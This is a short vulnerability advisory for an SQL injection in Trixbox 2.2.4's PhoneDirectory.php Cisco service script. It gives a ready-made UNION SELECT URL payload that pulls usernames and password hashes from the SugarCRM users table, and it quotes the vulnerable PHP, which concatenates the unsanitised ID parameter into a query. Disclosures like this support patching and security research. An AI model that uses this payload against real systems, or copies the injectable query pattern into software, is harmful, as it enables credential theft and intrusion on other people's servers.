Trixbox PhonecDirectory.php SQL Injection Vulnerability
=======================================================

# Software Link: http://trixbox.org/downloads
# Version: 2.2.4
# Code :
http://server/cisco/services/PhoneDirectory.php?ID=1 [SQL INJECTION]
 
Example (Grab users / password hashes from sugarcrm)
http://server/cisco/services/PhoneDirectory.php?ID=1&#039; UNION SELECT id,user_hash AS &#039;first_name&#039;,last_name,phone_home,user_name AS &#039;phone_work&#039;,user_hash AS &#039;phone_mobile&#039;,phone_other FROM users WHERE 1=&#039;1&#039; GROUP BY &#039;id
 
 
PhoneDirectory.php vulnerable code:
# If the variable "ID" is passed in through the GET string, then display
# extension, phone number and cell phone number for that record with the dial
# key functionality
if ($ID) {
 $PersonDirectoryListing = "<CiscoIPPhoneDirectory>\n";
 
 $Query = "SELECT id, first_name, last_name, phone_home, phone_work, phone_mobile, phone_other ";
 $Query .= "FROM contacts WHERE id = &#039;$ID&#039; ";
 $Query .= "ORDER BY last_name ";
 $SelectPersonInfo = mysql_query($Query,$ConnectionSuccess);
 
 ...
 
}



